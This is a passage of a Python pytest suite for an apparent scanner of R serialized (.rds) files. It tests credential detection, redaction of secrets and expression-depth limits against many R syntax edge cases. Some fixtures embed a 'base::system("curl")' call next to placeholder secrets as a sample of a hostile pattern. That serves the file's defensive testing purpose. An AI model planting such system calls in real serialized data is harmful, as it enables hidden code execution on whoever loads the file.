    assert "MULTILINE" not in sample
    assert "payload" not in sample


def test_scan_redacts_indented_multiline_credential_assignment(tmp_path: Path) -> None:
    path = tmp_path / "indented-multiline-credential-assignment.rds"
    _write_raw_r_serialized(
        path,
        'expression\nlanguage\nbase::system("curl"); token <- "FIRST_SECRET\n\tSECOND_SECRET base::system(curl)"',
    )

    result = RSerializedScanner().scan(str(path))

    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.FAILED
    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    sample = symbol_checks[0].details["examples"][0]["sample"]
    assert "FIRST_SECRET" not in sample
    assert "SECOND_SECRET" not in sample
    assert REDACTED_EVIDENCE_VALUE in sample


def test_scan_redacts_unterminated_quoted_assignment_without_credential_false_positive(tmp_path: Path) -> None:
    path = tmp_path / "unterminated-quoted-assignment.rds"
    _write_raw_r_serialized(
        path,
        'expression\nlanguage\nbase::system("curl"); token <- "UNTERMINATED_QUOTED_SECRET',
    )

    result = RSerializedScanner().scan(str(path))

    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.PASSED
    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    sample = symbol_checks[0].details["examples"][0]["sample"]
    assert "UNTERMINATED_QUOTED_SECRET" not in sample
    assert sample.endswith("token <- <redacted>")


def test_scan_detects_long_rightward_raw_credential_identifier(tmp_path: Path) -> None:
    path = tmp_path / "long-rightward-raw-assignment.rds"
    long_identifier = f"service_{'a' * 300}_token"
    _write_raw_r_serialized(
        path,
        f'expression\nlanguage\nbase::system("curl"); r"(LONG_RIGHTWARD_RAW_SECRET)" -> {long_identifier}',
    )

    result = RSerializedScanner().scan(str(path))

    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.FAILED
    symbol_checks = _check_by_name(result, "Executable Symbol Context Analysis")
    sample = symbol_checks[0].details["examples"][0]["sample"]
    assert "LONG_RIGHTWARD_RAW_SECRET" not in sample
    assert sample.startswith('base::system("curl"); <redacted> -> service_')


def test_scan_allows_benign_r_assignment_key_near_matches(tmp_path: Path) -> None:
    path = tmp_path / "benign-native-assignments.rds"
    _write_raw_r_serialized(
        path,
        "monkey <- 'BENIGN_VALUE'; tokenizer <- 'BENIGN_VALUE'; `not-a-tokenizer` <- 'BENIGN_VALUE'; "
        "`not a tokenizer` <- 'BENIGN_VALUE'; signature <- 'gaussian'; credential <- 'standard'; "
        "sas <- 'dataset-value'; sig <- 'benign-value'; token.count <- 'BENIGN_VALUE'; "
        "api.keyboard <- 'BENIGN_VALUE'; `not.a.tokenizer` <- 'BENIGN_VALUE'; "
        '"tokenizer" <- "BENIGN_VALUE"; "not a tokenizer" <- "BENIGN_VALUE"; '
        "tokenizer[1] <- 'BENIGN_VALUE'; config$tokenizer <- 'BENIGN_VALUE'; "
        'config[["tokenizer"]] <- "BENIGN_VALUE"',
    )

    result = RSerializedScanner().scan(str(path))

    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.PASSED


def test_scan_allows_benign_json_credential_key_metadata(tmp_path: Path) -> None:
    path = tmp_path / "benign-json-metadata.rds"
    _write_raw_r_serialized(
        path,
        '{"token": "standard", "client.secret": "metadata"}',
    )

    result = RSerializedScanner().scan(str(path))

    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.PASSED


def test_r_named_argument_helper_stops_function_body_at_completed_statement() -> None:
    text = 'function(token = "standard") "body"\nvalue'
    equals_position = text.index("=")

    assert r_scanner_module._r_named_argument_equals_positions(
        text,
        {equals_position},
        _r_non_code_spans(text),
    ) == {equals_position}


@pytest.mark.parametrize(
    "text",
    [
        'x$$y(token = "DOUBLE_DOLLAR_CALL_SECRET")',
        'x@@y(token = "DOUBLE_AT_CALL_SECRET")',
        'x::$y(token = "NS_DOLLAR_CALL_SECRET")',
        'x::y::z(token = "CHAINED_NS_CALL_SECRET")',
        'x$y::z(token = "MEMBER_NS_CALL_SECRET")',
        'x$$y[token = "DOUBLE_DOLLAR_SUBSCRIPT_SECRET"]',
        'x@@y[token = "DOUBLE_AT_SUBSCRIPT_SECRET"]',
        'x::$y[token = "NS_DOLLAR_SUBSCRIPT_SECRET"]',
        'x::y::z[token = "CHAINED_NS_SUBSCRIPT_SECRET"]',
        'x$y::z[token = "MEMBER_NS_SUBSCRIPT_SECRET"]',
    ],
)
def test_r_credential_assignment_helper_rejects_malformed_access_chains(text: str) -> None:
    assert r_scanner_module._contains_r_credential_assignment(text)


@pytest.mark.parametrize(
    "text",
    [
        'x$y$z(token = "standard")',
        'x@y$z(token = "standard")',
        'base::x(token = "standard")',
        'x$y$z[token = "standard"]',
        'x@y$z[token = "standard"]',
        'base::x[token = "standard"]',
    ],
)
def test_r_credential_assignment_helper_allows_valid_access_chains(text: str) -> None:
    assert not r_scanner_module._contains_r_credential_assignment(text)


@pytest.mark.parametrize(
    "metadata",
    [
        'r"(example: "NOT_A_SECRET" -> token)"',
        "'\"NOT_A_SECRET\" -> token'",
        '# "NOT_A_SECRET" -> token',
        'token: "NOT_A_SECRET"',
        'token: r"(NOT_A_SECRET)"',
        '# token <- r"(NOT_A_SECRET)"',
        '# r"(NOT_A_SECRET)" -> token',
        "'token <- r\"(NOT_A_SECRET)\"'",
        '# r"{BROKEN; token <- r"(NOT_A_SECRET)"',
        '\'r"{BROKEN; token <- r"(NOT_A_SECRET)"\'',
        'list(token = "standard")',
        'list(token = r"(standard)")',
        "list(token =)",
        "x[token =]",
        'list(token = "standard" + "suffix")',
        'list(token = "standard" == x)',
        'list(token = r"(standard)" == x)',
        'list(token = "standard" -> x)',
        'list(token = r"(standard)" ->> x)',
        'list(token = if (TRUE) "standard" else "fallback")',
        'list(token = for (x in values) "standard")',
        'list(token = for (`i` in values) "standard")',
        'list(token = function(x = 1, y) "standard")',
        'list(token = function(..., x = 1) "standard")',
        'list(token = \\(x = 1, y) "standard")',
        'list(token = \\(`x` = 1) "standard")',
        'list(token = c("standard", value))',
        'list(token = ("standard"))',
        'list(token = {"standard"; value})',
        'list(token = { x = 1; "standard" })',
        'list(token = local({ x = 1; r"(standard)" }))',
        'list(token = {"standard"\nvalue})',
        'list(token = {\n"standard"\n})',
        'list(token = c(name = "standard"))',
        'list(token = x["standard", value])',
        'list(token = object$field + "standard")',
        'list(token = object$"field" + "standard")',
        'list(token = "object"$field + "standard")',
        'list(token = object$r"(field)" + "standard")',
        'list(token = "standard" ** value)',
        'list(token = 0x1.1p2 + "standard")',
        'list(token = 1e-2 + "standard")',
        'list(token = 0x1p-2 + "standard")',
        "list(token = 1 |> identity())",
        "list(token = values |> sum(na.rm = TRUE))",
        "list(token = values |> base::identity())",
        'list(token = paste0("standard", values |> identity(data = _)))',
        'list(token = paste0("standard", values |> _$coef[[2]]))',
        'list(token = paste0("standard", values |> _@slot))',
        'list(token = factory()$field + "standard")',
        'list(token = make_object()@field + "standard")',
        'list(token = make_object()@"field" + "standard")',
        'list(token = base::identity("standard"))',
        'list(token = base::"identity"("standard"))',
        'list(token = r"(base)"::identity("standard"))',
        'list(\n  token = "standard"\n)',
        'list(\n#x\n  token = "standard"\n)',
        'x[\n  token = r"(standard)"\n]',
        'x[\n#x\n  token = r"(standard)"\n]',
        'get("list")(\n  token = "standard"\n)',
        '(identity)(\n  token = "standard"\n)',
        'function(token = "standard") NULL',
        'function(token = r"(standard)") NULL',
        'function(token = "standard" == x) NULL',
        'function(token = r"(standard)" ->> x) NULL',
        'function(token = local({ x = 1; "standard" })) NULL',
        'function\n(token = "standard") NULL',
        'function\n#x\n(token = "standard") NULL',
        'function # formal list follows\n(token = r"(standard)") NULL',
        'x\nfunction(token = "standard") NULL',
        'if (TRUE) function(token = r"(standard)") NULL',
        'function(token = "standard") +1',
        'function(token = r"(standard)") if (TRUE) NULL',
        'function(token = r"(standard)") if (TRUE) 1 else 2',
        'function(token = "standard") repeat break',
        'function(token = "standard") \\(x) x',
        'function(token = "standard") {}',
        'function(token = r"(standard)") "body"',
        'function(token = "standard") "body"\nvalue',
        'function(token = "standard") "body" # next statement\nvalue',
        'function(token = "standard") value +\nother',
        'function(token = r"(standard)") list(value + 1)',
        'function(token = "standard") { value + 1 }',
        'function(token = "standard") {\nvalue\n}',
        'function(token = "standard")\nvalue',
        '\\(token = r"(standard)") identity(value)',
        '\\(token = "standard")\nvalue',
        'list("token" = "standard")',
        'list(`token` = r"(standard)")',
        'list(NULL = "standard")',
        'x["token" = "standard"]',
        'x[NULL = r"(standard)"]',
        'function(`token` = r"(standard)") NULL',
        ') list(token = "standard")',
        '] list(token = r"(standard)")',
        '(] list(token = "standard")',
        '} function(token = paste0("stan", "dard")) NULL',
        'base::list(token = "standard")',
        'object$"f"(token = "standard")',
        'package::`f`(token = r"(standard)")',
        'x\nbase::list(token = "standard")',
        '"base"::list(token = "standard")',
        "'base':::list(token = r\"(standard)\")",
        '`list`(token = r"(standard)")',
        '"list"(token = "standard")',
        'if (TRUE) "list"(token = r"(standard)")',
        'function(x) "list"(token = "standard")',
        '`function`(token = "standard")',
        '\\(token = "standard") NULL',
        '\\ # formal list follows\n(token = r"(standard)") NULL',
        'if (TRUE) \\(token = "standard") NULL',
        'x\n\\(token = r"(standard)") NULL',
        'x %foo% function(token = "standard") NULL',
        'x %>% function(token = r"(standard)") NULL',
        'x %foo% list(token = "standard")',
        'x %foo% y[token = r"(standard)"]',
        'list(token = { x <- 1; "standard" })',
        'list(token = { x[1] <- 1; "standard" })',
        'list(token = { names(x) <<- 1; "standard" })',
        'list(token = { if (TRUE) x <- 1; "standard" })',
        'list(token = { x <- y <- 1; "standard" })',
        'list(token = "standard" -> object$field)',
        'list(token = "standard" -> x[1])',
        '{x; y}[token = "standard"]',
        'x[token = "standard"]',
        'x[[token = r"(standard)"]]',
        'x[token = r"(standard)" == x]',
        'x[token = "standard" -> x]',
        'x[token = { x = 1; r"(standard)" }]',
        '(1 + 1)[token = "standard"]',
        '(x)[token = "standard"]',
        'if (TRUE) (x)[token = "standard"]',
        'identity(x)[token = r"(standard)"]',
        'f(x, y)(token = "standard")',
        'x[a, b](token = "standard")',
        '{x; y}(token = "standard")',
        'functions[1](token = "standard")',
        'get("functions")[1](token = r"(standard)")',
        '(functions[1])(token = "standard")',
        '((functions[1]))(token = r"(standard)")',
        'outer(list(token = "standard"))',
        '(identity)(token = "standard")',
        '(function(x) x)(token = "standard")',
        'get("list")(token = r"(standard)")',
        'r"(list)"(token = "standard")',
        'get("x")[token = r"(standard)"]',
        'null(token = "standard")',
        'false(token = r"(standard)")',
        'inf(token = "standard")',
        'True(token = r"(standard)")',
        'repeat (identity)(token = "standard")',
        'if (FALSE) NULL else (identity)(token = r"(standard)")',
        'TRUE[token = "standard"]',
        'NULL[token = r"(standard)"]',
        'NA_integer_[token = "standard"]',
        '1[token = r"(standard)"]',
        '....(token = "standard")',
        '.(token = r"(standard)")',
        '..[token = "standard"]',
        '{identity}(token = r"(standard)")',
        '{list()}[token = "standard"]',
        'NULL\n(identity)(token = r"(standard)")',
        '1 # completed expression\n(identity)(token = "standard")',
        'x[1]\nlist(token = "standard")',
        '{x}\ny[token = r"(standard)"]',
        'outer(x,\nlist(token = "standard"))',
        'outer(x +\nlist(token = "standard"))',
        'outer({x\nlist(token = r"(standard)")})',
        'list(token = if (TRUE) for (x in y) {} else "standard")',
        'list(token = if (TRUE) if (FALSE) "x" else "y" else "standard")',
        'package::x[token = "standard"]',
        'package::"x"[token = r"(standard)"]',
        'object$x[token = r"(standard)"]',
        'object$"x"[token = "standard"]',
        'object@x[token = "standard"]',
    ],
)
def test_scan_allows_assignment_examples_inside_benign_metadata(tmp_path: Path, metadata: str) -> None:
    path = tmp_path / "benign-assignment-example.rds"
    _write_raw_r_serialized(path, metadata)

    result = RSerializedScanner().scan(str(path))

    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.PASSED


@pytest.mark.parametrize(
    "assignment",
    [
        '( token = "UNMATCHED_PAREN_SECRET"',
        '[ token = "UNMATCHED_BRACKET_SECRET"',
        '( token = r"(UNMATCHED_RAW_PAREN_SECRET)"',
        '[ token = r"(UNMATCHED_RAW_BRACKET_SECRET)"',
        '(] token = "MISMATCHED_PAREN_SECRET")',
        '[) token = r"(MISMATCHED_RAW_BRACKET_SECRET)"]',
    ],
)
def test_scan_unmatched_delimiters_do_not_hide_equal_assignments(tmp_path: Path, assignment: str) -> None:
    path = tmp_path / "unmatched-delimiter-credential.rds"
    _write_raw_r_serialized(path, assignment)

    result = RSerializedScanner().scan(str(path))

    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.FAILED


@pytest.mark.parametrize(
    "assignment",
    [
        '(token = "GROUPED_QUOTED_SECRET")',
        '(token = r"(GROUPED_RAW_SECRET)")',
        '(token = paste0("GROUPED_", "EXPRESSION_SECRET"))',
        'if (token = "CONDITION_SECRET") TRUE',
        'list((token = "NESTED_GROUP_SECRET"))',
        ') (token = "STRAY_CLOSER_SECRET")',
        '1(token = r"(NUMERIC_PREFIX_SECRET)")',
        'if (TRUE) (token = "CONTROL_BODY_SECRET")',
        'function() (token = r"(FUNCTION_BODY_SECRET)")',
        '[token = "STANDALONE_BRACKET_SECRET"]',
        '[[token = r"(STANDALONE_DOUBLE_BRACKET_SECRET)"]]',
        '...(token = r"(ELLIPSIS_SECRET)")',
        'if[token = r"(RESERVED_SUBSCRIPT_SECRET)"]',
        'function[token = "RESERVED_FUNCTION_SUBSCRIPT_SECRET"]',
        '...(x)(token = r"(COMPUTED_ELLIPSIS_SECRET)")',
        '1(x)(token = "COMPUTED_NUMERIC_SECRET")',
        '(1)(token = r"(GROUPED_NUMERIC_SECRET)")',
        '(1L)(token = "GROUPED_INTEGER_SECRET")',
        '(NULL)(token = r"(GROUPED_NULL_SECRET)")',
        'function(token = "INCOMPLETE_FUNCTION_QUOTED_SECRET")',
        'function(token = r"(INCOMPLETE_FUNCTION_RAW_SECRET)")',
        'function(token = "COMMENT_ONLY_FUNCTION_BODY_SECRET") # no body',
        'function(token = r"(SEPARATOR_ONLY_FUNCTION_BODY_SECRET)"); next_expression',
        '\\(token = "INCOMPLETE_LAMBDA_QUOTED_SECRET")',
        '\\(token = r"(INCOMPLETE_LAMBDA_RAW_SECRET)")',
        'base::function(token = r"(QUALIFIED_FUNCTION_SECRET)") NULL',
        'object$function(token = "MEMBER_FUNCTION_SECRET") NULL',
        '(1 + 1)(token = r"(GROUPED_ARITHMETIC_SECRET)")',
        '(-1)(token = "GROUPED_SIGNED_NUMERIC_SECRET")',
        '{1}(token = r"(BRACED_NUMERIC_SECRET)")',
        '{1 + 1}(token = "BRACED_ARITHMETIC_SECRET")',
        'x function(token = r"(INVALID_FUNCTION_BOUNDARY_SECRET)") NULL',
        'x % function(token = r"(INCOMPLETE_INFIX_BOUNDARY_SECRET)") NULL',
        'function(token = r"(OPERATOR_ONLY_FUNCTION_BODY_SECRET)") +',
        '1[1](token = r"(NUMERIC_SUBSCRIPT_RESULT_SECRET)")',
        '(1 + 1)[1](token = "GROUPED_SUBSCRIPT_RESULT_SECRET")',
        'function(token = r"(TRUNCATED_IF_BODY_SECRET)") if',
        'function(token = "TRUNCATED_IF_CONDITION_SECRET") if (TRUE)',
        'function(token = r"(TRUNCATED_REPEAT_BODY_SECRET)") repeat',
        'function(token = r"(OPENER_ONLY_FUNCTION_BODY_SECRET)") {',
        'function(token = "UNTERMINATED_LITERAL_BODY_SECRET") "',
        'function(token = r"(UNTERMINATED_RAW_BODY_SECRET)") r"(',
        r'x\(token = r"(PREFIXED_LAMBDA_SECRET)") NULL',
        r'1 \(token = "NUMERIC_PREFIXED_LAMBDA_SECRET") NULL',
        'x\\\n(token = "PREFIXED_SPLIT_LAMBDA_SECRET") NULL',
        '(1[1])(token = r"(GROUPED_NUMERIC_SUBSCRIPT_RESULT_SECRET)")',
        '((1[1]))(token = "NESTED_GROUPED_NUMERIC_SUBSCRIPT_RESULT_SECRET")',
        'function(token = r"(TRUNCATED_ELSE_BODY_SECRET)") if (TRUE) 1 else',
        'list(token = "standard"); token = "MIXED_BATCH_SECRET"',
        'x[[token = r"(TRUNCATED_DOUBLE_SUBSCRIPT_SECRET)"]',
        'outer(list(token = "TRUNCATED_OUTER_CALL_SECRET")',
        '1(x)[token = r"(NUMERIC_CALL_RESULT_SECRET)"]',
        'NULL(token = "RESERVED_NULL_SECRET")',
        'FALSE(token = r"(RESERVED_FALSE_SECRET)")',
        'Inf(token = "RESERVED_INF_SECRET")',
        '_hidden(token = "INVALID_IDENTIFIER_SECRET")',
        '1invalid[token = r"(INVALID_NUMERIC_PREFIX_SECRET)"]',
        '[identity](token = "STANDALONE_BRACKET_SECRET")',
        '[identity][token = r"(STANDALONE_NESTED_BRACKET_SECRET)"]',
        'if\n(token = "CONTROL_NEWLINE_SECRET") TRUE',
        'function(token = "TRUNCATED_CALL_BODY_SECRET") list(',
        'function(token = "TRUNCATED_NEWLINE_CALL_BODY_SECRET")\nlist(',
        'function(token = r"(TRUNCATED_RAW_OPERATOR_BODY_SECRET)") value +',
        '\\(token = "TRUNCATED_LAMBDA_CALL_BODY_SECRET") identity(',
        'function(token = r"(TRAILING_GROUP_OPERATOR_SECRET)") { value + }',
        'function(token = "TRAILING_CALL_OPERATOR_SECRET") list(value +)',
        'function(token = paste0("EXPRESSION_", "TRUNCATED_SECRET")) value <-',
        'function(token = r"(TRUNCATED_EQUALS_BODY_SECRET)") value =',
        'list(token = "TRUNCATED_ARGUMENT_SECRET" +)',
        'x[token = r"(TRUNCATED_INDEX_SECRET)" +]',
        'list(token = if (TRUE) "TRUNCATED_CONTROL_SECRET" else)',
        'list(token = \\(x) if (TRUE) "TRUNCATED_LAMBDA_ELSE_SECRET" else)',
        'list(token = \\(x) if (TRUE) "SPACED_LAMBDA_ELSE_SECRET" else   )',
        'list(token = "ADJACENT_ARGUMENT_SECRET" value)',
        'list(token = paste0("ADJACENT_CALL_SECRET") value)',
        'list(token = paste0("SEMICOLON_SECRET"); value)',
        'list(token = if (TRUE) "ADJACENT_CONTROL_SECRET" value)',
        'function(token = paste0("ADJACENT_DEFAULT_SECRET")) value value',
        'function(token = "DANGLING_ELSE_SECRET") if (TRUE) "x"\nelse "y"',
        'list(token = (paste0("NESTED_GROUP_SECRET") value))',
        'list(token = { paste0("NESTED_BRACE_SECRET") value })',
        'list(token = if (TRUE) (paste0("NESTED_CONTROL_SECRET") value))',
        'list(token = if () "EMPTY_IF_SECRET")',
        'list(token = while () "EMPTY_WHILE_SECRET")',
        'list(token = for () "EMPTY_FOR_SECRET")',
        'list(token = for (x) "MISSING_IN_FOR_SECRET")',
        'list(token = for (x in) "MISSING_SEQUENCE_FOR_SECRET")',
        'list(token = value ! "MALFORMED_BANG_SECRET")',
        'list(token = value +* "MALFORMED_OPERATOR_SECRET")',
        'list(token = value % "MALFORMED_PERCENT_SECRET")',
        'list(token = 1x + "NUMERIC_SUFFIX_VALUE_SECRET")',
        'list(token = .1x + "DOT_NUMERIC_SUFFIX_VALUE_SECRET")',
        'list(token = _ + "UNDERSCORE_VALUE_SECRET")',
        'list(token = 1::foo + "NUMERIC_NAMESPACE_VALUE_SECRET")',
        'list(token = "SECOND_EQUALS_SECRET" = value)',
        'list(token = { "BRACED_EQUALS_SECRET" = value })',
        'list(token = "TRUNCATED_COMPARISON_SECRET" ==)',
        'list(token = r"(TRUNCATED_RIGHTWARD_SECRET)" ->)',
        '1$f(token = "NUMERIC_MEMBER_RECEIVER_SECRET")',
        '1$"f"(token = r"(QUOTED_MEMBER_RECEIVER_SECRET)")',
        'NULL@f(token = r"(NULL_SLOT_RECEIVER_SECRET)")',
        '1::f(token = "NUMERIC_NAMESPACE_RECEIVER_SECRET")',
        '1::`f`(token = "BACKTICK_NAMESPACE_RECEIVER_SECRET")',
        'list(obj$token = "MEMBER_TAG_SECRET")',
        'list(obj@token = r"(SLOT_TAG_SECRET)")',
        'list(x["token"] = "SUBSCRIPT_TAG_SECRET")',
        'x[obj$token = r"(SUBSCRIPT_MEMBER_TAG_SECRET)"]',
        'function("token" = "QUOTED_FORMAL_SECRET") NULL',
        'function(obj$token = r"(MEMBER_FORMAL_SECRET)") NULL',
        'function(x["token"] = "SUBSCRIPT_FORMAL_SECRET") NULL',
        '1"list"(token = r"(QUOTED_CALLEE_BOUNDARY_SECRET)")',
        'x`list`(token = "BACKTICK_CALLEE_BOUNDARY_SECRET")',
        '1"x"[token = "QUOTED_SUBSCRIPT_BOUNDARY_SECRET"]',
        'x`obj`[token = "BACKTICK_SUBSCRIPT_BOUNDARY_SECRET"]',
        'x list(token = r"(IDENTIFIER_CALLEE_BOUNDARY_SECRET)")',
        '1 list(token = r"(NUMERIC_CALLEE_BOUNDARY_SECRET)")',
        'x y[token = r"(IDENTIFIER_SUBSCRIPT_BOUNDARY_SECRET)"]',
        '1 y[token = r"(NUMERIC_SUBSCRIPT_BOUNDARY_SECRET)"]',
        'list(token = if (TRUE FALSE) "INVALID_IF_HEADER_SECRET")',
        'list(token = for (x in y z) "INVALID_FOR_HEADER_SECRET")',
        'list(token = for (`i in values) "UNTERMINATED_BACKTICK_FOR_SECRET")',
        'list(token = function(x=) "INCOMPLETE_FORMAL_SECRET")',
        'list(token = function(x y) "ADJACENT_FORMAL_SECRET")',
        'list(token = \\(x=) "INCOMPLETE_LAMBDA_FORMAL_SECRET")',
        'list(token = \\(x y) "ADJACENT_LAMBDA_FORMAL_SECRET")',
        'list(token = c("NESTED_CALL_ARGUMENT_SECRET" value))',
        'list(token = x["NESTED_SUBSCRIPT_ARGUMENT_SECRET" value])',
        'list(token = {"BRACE_COMMA_SECRET", value})',
        'list(token = {"BRACE_SEMICOLON_SECRET"; value value})',
        'list(token = 1$f + "NUMERIC_MEMBER_VALUE_SECRET")',
        'list(token = TRUE@f + "RESERVED_SLOT_VALUE_SECRET")',
        'list(token = x$1 + "NUMERIC_MEMBER_NAME_SECRET")',
        'list(token = x@ + "MISSING_SLOT_SECRET")',
        'list(token = x::1 + "NUMERIC_NS_NAME_SECRET")',
        'list(token = x$TRUE + "RESERVED_MEMBER_NAME_SECRET")',
        'list(token = object$..1 + "DOT_DOT_MEMBER_NAME_SECRET")',
        'list(token = object@... + "ELLIPSIS_SLOT_NAME_SECRET")',
        'list(token = package::..2 + "DOT_DOT_NAMESPACE_NAME_SECRET")',
        'list(token = package:::... + "ELLIPSIS_INTERNAL_NAMESPACE_NAME_SECRET")',
        'list(token = base::foo::bar + "CHAINED_NAMESPACE_SECRET")',
        'list(token = x$foo::bar + "MEMBER_NAMESPACE_SECRET")',
        'x base::list(token = r"(NAMESPACE_BOUNDARY_SECRET)")',
        '"x" "base"::list(token = r"(QUOTED_NAMESPACE_BOUNDARY_SECRET)")',
        'list(token = if (TRUE, FALSE) "COMMA_IF_HEADER_SECRET")',
        'list(token = while (TRUE; FALSE) "SEMICOLON_WHILE_HEADER_SECRET")',
        'list(token = for (x in y, z) "COMMA_FOR_HEADER_SECRET")',
        'list(token = function(... = 1) "ELLIPSIS_DEFAULT_SECRET")',
        'list(token = if ((TRUE, FALSE)) "GROUPED_COMMA_HEADER_SECRET")',
        'list(token = () + "EMPTY_GROUP_VALUE_SECRET")',
        'list(token = ["STANDALONE_BRACKET_VALUE_SECRET"])',
        'list(token = 1 |> "NATIVE_PIPE_RHS_SECRET")',
        'list(token = 1 |> if (TRUE) identity("PIPE_IF_SECRET") else identity())',
        'list(token = 1 |> identity + paste0("PIPE_", "OPERATOR_SECRET"))',
        'list(token = 1 |> repeat identity("PIPE_REPEAT_SECRET"))',
        'list(token = 1 |> _ + "PIPE_PLACEHOLDER_SECRET")',
        'list(token = 1 |> identity(_, "PIPE_POSITIONAL_SECRET"))',
        'list(token = 1 |> identity(data = _ + "PIPE_EXPRESSION_SECRET"))',
        'list(token = 1 |> identity(a = _, b = _, label = "MULTI_PLACEHOLDER_SECRET"))',
        '(1)(x)[token = "INVALID_CALL_SUBSCRIPT_SECRET"]',
        '(1)(x)(token = "INVALID_CALL_ARGUMENT_SECRET")',
        '(1)(x)$f(token = "INVALID_CALL_MEMBER_SECRET")',
        '(1)(x)[1][token = "INVALID_CHAIN_SUBSCRIPT_SECRET"]',
        'f(x y)(token = "BAD_PRECALL_ARGS_SECRET")',
        'f(x y)[token = "BAD_PRECALL_SUBSCRIPT_SECRET"]',
        'f(x y)$g(token = "BAD_PRECALL_MEMBER_SECRET")',
        'x[a b](token = "BAD_SUBSCRIPT_ARGS_SECRET")',
        'x[a b][token = "BAD_SUBSCRIPT_CHAIN_SECRET"]',
        '(x y)(token = "BAD_GROUPED_SECRET")',
        '{x y}(token = "BAD_BRACED_SECRET")',
        'list(token = 1 <- "INVALID_LEFT_ASSIGNMENT_SECRET")',
        'list(token = x + y <- "INVALID_COMPLEX_LEFT_SECRET")',
        'list(token = x && y <<- "INVALID_SUPER_LEFT_SECRET")',
        'list(token = "INVALID_RIGHT_ASSIGNMENT_SECRET" -> TRUE)',
        'list(token = "INVALID_SUPER_RIGHT_SECRET" ->> FALSE)',
        'list(token = "INVALID_RIGHT_EXPRESSION_SECRET" -> x + y)',
        'list(token = x + y = "INVALID_EQUALS_TARGET_SECRET")',
        'list(token = { if (TRUE) x + y <- "INVALID_CONTROL_ASSIGN_SECRET" })',
        '{x y}[token = "INVALID_BRACED_RECEIVER_SECRET"]',
        '{1, x}[token = "INVALID_BRACED_COMMA_SECRET"]',
        'list(token = if (TRUE) "SPLIT_ELSE_SECRET"\nelse "x")',
        'list(token = if (TRUE) {"COMMENT_SPLIT_ELSE_SECRET"} # gap\nelse "x")',
        'x[1]list(token = "SUBSCRIPT_ADJACENT_SECRET")',
        '{x} y[token = "BRACE_IDENT_SECRET"]',
        'outer(x\nlist(token = "INNER_NEWLINE_SECRET"))',
        'list(token = for (x in y) {} else "FOR_ELSE_SECRET")',
        'list(token = foo() else "CALL_ELSE_SECRET")',
        'list(token = if (TRUE) "x" else "y" else "SECOND_ELSE_SECRET")',
        '1::x[token = "BAD_NS_SUBSCRIPT_SECRET"]',
        'NULL$x[token = "BAD_MEMBER_SUBSCRIPT_SECRET"]',
        '1::obj$x[token = "BAD_CHAINED_NS_SUBSCRIPT_SECRET"]',
        'NULL$x$y[token = "BAD_CHAINED_MEMBER_SUBSCRIPT_SECRET"]',
        '1::"x"[token = "BAD_QUOTED_NS_SUBSCRIPT_SECRET"]',
        'NULL$"x"[token = "BAD_QUOTED_MEMBER_SUBSCRIPT_SECRET"]',
        'x$$y(token = "DOUBLE_DOLLAR_CALL_SECRET")',
        'x::y::z(token = "CHAINED_NS_CALL_SECRET")',
    ],
)
def test_scan_grouped_equal_assignments_are_detected(tmp_path: Path, assignment: str) -> None:
    path = tmp_path / "grouped-credential-assignment.rds"
    _write_raw_r_serialized(path, assignment)

    result = RSerializedScanner().scan(str(path))

    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.FAILED


def test_scan_batches_repeated_named_argument_validation(tmp_path: Path) -> None:
    path = tmp_path / "repeated-named-arguments.rds"
    fragments = (
        'list(token = "standard")',
        'list(token = r"(standard)")',
        'list(token = paste0("stan", "dard"))',
        '(identity)(token = r"(standard)")',
    )
    metadata = ";".join(fragments[index % len(fragments)] for index in range(3_000))
    _write_raw_r_serialized(path, metadata)

    result = RSerializedScanner().scan(str(path))

    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.PASSED


def test_scan_deep_repeat_prefix_is_bounded_without_recursion_error(tmp_path: Path) -> None:
    path = tmp_path / "deep-expression-prefix.rds"
    _write_raw_r_serialized(path, 'function(token = "DEEP_PREFIX_SECRET") ' + "repeat " * 1_100 + "break")

    result = RSerializedScanner().scan(str(path))

    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.PASSED


def test_scan_expression_depth_ceiling_is_inconclusive(tmp_path: Path) -> None:
    path = tmp_path / "deep-expression-nesting.rds"
    nested_body = "if (TRUE) " * 130 + "break"
    _write_raw_r_serialized(path, f'function(token = "standard") {nested_body}')

    result = RSerializedScanner().scan(str(path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "r_serialized_expression_depth_incomplete" in result.metadata["scan_outcome_reasons"]
    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.PASSED
    ceiling_checks = _check_by_name(result, "R Expression Analysis Ceiling")
    assert len(ceiling_checks) == 1
    assert ceiling_checks[0].details["scan_outcome_reason"] == "r_serialized_expression_depth_incomplete"


def test_scan_expression_depth_ceiling_preserves_earlier_credential_detection(tmp_path: Path) -> None:
    path = tmp_path / "deep-expression-after-visible-secret.rds"
    nested_value = "if (TRUE) " * 130 + '"standard"'
    _write_raw_r_serialized(
        path,
        f'token = paste0("VISIBLE_DEPTH_SECRET"); list(secret = {nested_value})',
    )

    result = RSerializedScanner().scan(str(path))

    assert result.success is False
    assert "r_serialized_expression_depth_incomplete" in result.metadata["scan_outcome_reasons"]
    credential_checks = _check_by_name(result, "Credential-like String Detection")
    assert len(credential_checks) == 1
    assert credential_checks[0].status == CheckStatus.FAILED


